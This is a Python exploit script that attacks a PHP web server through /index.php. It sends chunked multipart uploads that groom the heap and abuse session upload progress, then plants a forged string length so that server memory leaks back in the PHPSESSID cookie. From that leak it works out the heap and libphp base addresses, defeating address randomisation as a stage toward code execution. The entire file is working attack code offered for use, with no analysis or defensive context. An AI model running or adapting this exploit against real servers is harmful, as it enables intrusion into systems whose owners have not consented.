#!/usr/bin/env python3
import socket, struct, sys, threading, time, urllib.parse
from collections import Counter

ZVAL_PTR_DTOR = 0x65EB60                       # libphp-relative (GDB landmark)
PTR_LO, PTR_HI = 0x1000_0000_0000, 0x8000_0000_0000
BND_FILL = b"S" * 17
BND_LEAK = b"B" * 10
SID = b"attacksessionid0001"
HUGE_MB = 129


def part(name, value=b"", filename=None, ctype=None, bnd=BND_FILL):
    h = b"--" + bnd + b'\r\nContent-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        h += b'; filename="' + filename + b'"'
    if ctype is not None:
        h += b"\r\nContent-Type: " + ctype
    return h + b"\r\n\r\n" + value + b"\r\n"


class Http:
    def __init__(self, host, port):
        self.host, self.port = host, port

    def _drain(self, s, out, cap):
        try:
            while len(out) < cap:
                b = s.recv(min(65536, cap - len(out)))
                if not b:
                    break
                out.extend(b)
        except OSError:
            pass

    def post_chunked(self, blocks, boundary, timeout=120.0):
        head = (b"POST /index.php HTTP/1.1\r\nHost: %s\r\n"
                b"Content-Type: multipart/form-data; boundary=%s\r\n"
                b"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
                % (self.host.encode(), boundary))
        s = socket.create_connection((self.host, self.port), timeout)
        s.settimeout(timeout)
        out = bytearray()
        rd = threading.Thread(target=self._drain, args=(s, out, 1 << 20), daemon=True)
        rd.start()
        try:
            s.sendall(head)
            for b in blocks:
                s.sendall(b"%X\r\n" % len(b) + b + b"\r\n")
            s.sendall(b"0\r\n\r\n")
        except OSError:
            pass
        rd.join(timeout + 1)
        s.close()
        return bytes(out)

    def post_raw(self, body, boundary, timeout=90.0, cap=2 << 20):
        head = (b"POST /index.php HTTP/1.1\r\nHost: %s\r\n"
                b"Content-Type: multipart/form-data; boundary=%s\r\n"
                b"Content-Length: %d\r\nConnection: close\r\n\r\n"
                % (self.host.encode(), boundary, len(body)))
        s = socket.create_connection((self.host, self.port), timeout)
        s.settimeout(timeout)
        out = bytearray()
        rd = threading.Thread(target=self._drain, args=(s, out, cap), daemon=True)
        rd.start()
        try:
            s.sendall(head + body)
        except OSError:
            pass
        rd.join(timeout + 1)
        s.close()
        return bytes(out)


def rotate(http):
    blocks = [part(b"f%04d" % i, b"V" * 3000) for i in range(1001)]
    blocks += [part(b"PHPSESSID", b"\x00"),
               part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
               part(b"f", b"A" * 64, filename=b"a.txt")]
    blocks += [part(b"big", b"B" * (1 << 20))] * HUGE_MB
    http.post_chunked(blocks, BND_FILL, timeout=120.0)
    time.sleep(0.3)
    http.post_chunked([part(b"PHPSESSID", SID, bnd=b"BNDRY12345"),
                       part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn", bnd=b"BNDRY12345")],
                      b"BNDRY12345", timeout=20)
    time.sleep(0.5)


def decode_bases(raw):
    if len(raw) < 1000:
        return 0, 0, 0
    heaps = Counter()
    for i in range(len(raw) - 7):                  # chunk base = densest 2 MB bucket
        v = int.from_bytes(raw[i:i + 8], "little")
        if PTR_LO <= v < PTR_HI:
            heaps[v & ~0x1FFFFF] += 1
    if not heaps:
        return 0, 0, 0
    heap, hits = heaps.most_common(1)[0]
    mods = Counter()
    for i in range(0, len(raw) - 7, 8):            # libphp base = dtor page match
        v, = struct.unpack_from("<Q", raw, i)
        if (PTR_LO <= v < PTR_HI and v & 0xFFF == ZVAL_PTR_DTOR & 0xFFF
                and (v & ~0x1FFFFF) != heap):
            mods[v - ZVAL_PTR_DTOR] += 1
    module, mhits = mods.most_common(1)[0] if mods else (0, 0)
    if hits < 8:
        return 0, 0, 0
    return heap, (module if mhits >= 8 else 0), sum(heaps.values())


def leak(http, tries=4):
    for attempt in range(1, tries + 1):
        rotate(http)
        prod = [part((b"g%04d" % i + b"x" * 103)[:103], b"v" * 8) for i in range(63)]
        prod.append(part(b"999997", b"W" * 60))
        for i in range(250):
            prod.append(part(b"%d" % (1000 + i), b"B" * (258000 + (1360 if i == 0 else 0))))
        prod += [part(b"%d" % (100000 + i), b"X" * 231) for i in range(208)]
        prod += [part(b"%d" % (200000 + i), b"T" * 15000) for i in range(100)]
        prod += [part(b"%d" % (300000 + i), b"U" * 4000) for i in range(117)]
        prod += [part(b"999990", b"z" * 32), part(b"PHPSESSID", b"\x00"),
                 part(b"PHP_SESSION_UPLOAD_PROGRESS", b"p" * 200),
                 part(b"F" * 103, b"A" * 64, filename=b"A" * 99 + b".txt")]
        http.post_chunked(prod, BND_FILL)
        val = bytearray(b"V" * 231)
        struct.pack_into("<Q", val, 0x78, 0x4000)
        cons = [part(b"%d" % (1000 + i), bytes(val), bnd=BND_LEAK) for i in range(40)]
        forged = bytearray(b"W" * 4000)
        struct.pack_into("<Q", forged, 0x80, 0x4141414141414141)
        struct.pack_into("<Q", forged, 0x90, 600_000)   # fake zend_string.len
        cons.append(part(b"900000", bytes(forged), bnd=BND_LEAK))
        cons += [part(b"post%d[0]" % i, b"n", bnd=BND_LEAK) for i in range(40)]
        cons += [part(b"PHPSESSID", SID, bnd=BND_LEAK),
                 part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn", bnd=BND_LEAK)]
        resp = http.post_raw(b"".join(cons), BND_LEAK)
        m = resp.split(b"Set-Cookie: PHPSESSID=", 1)
        raw = b""
        if len(m) > 1:
            raw = urllib.parse.unquote_to_bytes(
                m[1].split(b"; path=/", 1)[0].decode("latin1"))
        heap, module, count = decode_bases(raw)
        print("leak %d/%d: cookie=%dB ptrs=%d heap=%#x libphp=%#x"
              % (attempt, tries, len(raw), count, heap, module), flush=True)
        if heap and module:
            return heap, module
    return 0, 0


if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.exit("usage: python3 leak.py <host> <port>")
    h, m = leak(Http(sys.argv[1], int(sys.argv[2])))
    print("chunk=%#x libphp=%#x" % (h, m))
